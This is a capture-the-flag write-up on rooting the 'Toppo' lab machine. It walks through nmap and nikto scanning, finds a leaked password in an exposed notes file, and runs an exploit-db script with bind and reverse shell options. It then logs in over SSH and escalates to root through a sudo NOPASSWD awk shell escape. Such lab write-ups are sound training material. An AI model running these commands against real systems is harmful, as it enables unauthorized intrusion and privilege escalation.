### Toppo Write-up


### Information Gathering

Step 0:

- Kali Linux IP:  192.168.56.102         ```ifconfig```
- Host Machine IP:   192.168.56.1 and 192.168.56.100 (host only)   ```ipconfig``` (It is a window machine)
- Target Machine IP:  192.168.56.101

Step 01: netdiscover -i eth1 -r 192.168.56.102/24

- ![](images/netdiscover.png)


### Scanning

Step 02:
- check whether host is alive
- ```nmap -sn 192.168.56.101``` (It is)
- ```nmap -sC -sV -A -p- 192.168.56.101 > nmap.txt```
- ```cat nmap.txt```

- ![](images/nmap.png)

Monologue: You can see there are few interesting ports are open; I will clean-up the output.

#### Cleaned Ouput
- 22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
- 80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
- 111/tcp   open  rpcbind 2-4 (RPC 100000)
  - rpcinfo:
     - program version   port/proto  service
     - 100000  2,3,4        111/tcp  rpcbind
     - 100000  2,3,4        111/udp  rpcbind
     - 100024  1          36544/udp  status
    - 100024  1          37431/tcp  status
- 37431/tcp open  status  1 (RPC \#100024)
#### and more
***

Step 03:
- As usual, I am going to open the browser and gonna check the ip with robots.txt and try all the ports I got here. If I get anything interesting I will enclose the screenshot here.
- I browse the 192.168.56.101  (default port 80).

- ![](images/p80.png)

- I didn't get anything on port 111 and 37431. (little skeptical in my mind that I am missing something here). Anyway, I will do a nikto with each of the port; and will report only when I find anything.

Step 04:
- ```nikto -h 192.168.56.101 > nikto80.txt```
- ```nikto -h 192.168.56.101 -p 111 > nikto80.txt```  (didn't work)
- ```nikto -h 192.168.56.101 -p 37431 > nikto80.txt``` (no webserver found)
- ```cat nikto80.txt```

- ![](images/nikto80.png)

Monologue: There is directory indexing
- 192.168.56.101/admin
- ![](images/admin.png)

- We found an interesting notes.txt file as well

- ![](images/notes_in_admin.png)


- ```Note to myself :
I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .```

- Password: 12345ted123  (fishing and soccer)
- username: ted or ted123 (my guess)

- 192.168.56.101/img
- ![](images/img.png)

Monologue: Although it looks harmless but I have seen stegnographed photo in the past. Therefore, I don't want to take chance. I am gonna download all and keep it for backup (further enumerate if I bump my head on the wall)

- [about-bg](/imgs/about-bg.jpg), [contact-bg](imgs/contact-bg.jpg), [home-bg](/imgs/home-bg.jpg), [post-bg](/imgs/post-bg.jpg), [post-sample-image.jpg](/imgs/post-sample-image.jpg)

- 192.168.56.101/mail
- ![](images/mail.png)

Monologue: Although there is a PHP file here but it doesn't do much. I will keep it a low priority.

- 192.168.56.101/manual/images/

- ![](images/manual-images.png)

Monologue: I am afraid it is just a rabbit hole ??!!

- 192.168.56.101/manual

Monologue: Running Apache and version is 2.4

- ![](images/manual.png)

- 192.168.56.101/icons/README  (Nothing important)

***
Note: so far I got only this information.

- Password: 12345ted123  (fishing and soccer)
- username: ted or ted123 (my guess)
***
Step 05:

Let's check google, exploit-db, nist, packet-storm, cve, anything .. but find a working exploit.

- [exploit-db](https://www.exploit-db.com/exploits/34900/)

### How to use that exploit ?

- ```wget https://www.exploit-db.com/download/34900.py```
- ```python exploit.py payload=bind rhost=192.168.56.101 rport=80```
- or

- ```python exploit.py payload=reverse rhost=192.168.56.101 lhost=192.168.56.102 lport=80```

Note: I tried both port 80 and port 111. (other port didn't give me anything)

- ![](images/exploited.png)

Monologue: However it left me keep banging my head on table because my privilege escalation skill is rather rusty..
Therefore, I thought why not I just keep a note of it and target some low hanging fruit?!!
***
- Remember we have (check line 68 and 69 provided you need to recall how we got this :) Sometime happens)
- Password: 12345ted123  (fishing and soccer)
- username: ted or ted123 (my guess)

Step 06:
- Let me do a SSH using above credentials
- ```ssh ted@192.168.56.101```
- ```password: 12345ted123```

- ![](images/ssh.png)

- Before I get drive into privilege escalation part, let me check in the sudoers' list

- ```cat /etc/sudoers```

- ![](images/sudo.png)

Monologue: To be honest, I am not sure why I need to check sudoers, but many a times while I play with Vulhub, it become like habbit to check the source code etc (in this case I totally forgot. Anyway.)

- Let me google on /usr/bin/awk (remember it has NOPASSWD)

- [check this github](https://github.com/xapax/security/blob/master/privilege_escalation_-_linux.md)
- ```awk 'BEGIN {system("/bin/bash")}'``` (this command is executing)
- So I tried
  - ```awk 'BEGIN {system("ls /root")}'```  (Yes, shows there is a flag, which is the main goal of this task)
  - ```awk 'BEGIN {system("cat /root/flag.txt")}'```

  - ![](images/flag.png)

Note: ```Congratulations ! there is your flag :0wnedlab{p4ssi0n_c0me_with_pract1ce}```

### Post Exploitation

- This is one the main important aspect once you get the access to the box. People usually hide some script in there to keep the persistent connection with the box and clean all the logs.

- However, we will not discuss much of it here. May be I will do a thorough research myself first and then discuss it with you :)

***

I am sure there are many ways to hack this machine and I am going to explore in the times to come. Rest of the weekend, I think it is better for me to polish my Linux Privilege Escalation skill to safe more time to pop the next machine :)

Happy Weekend to all!!  
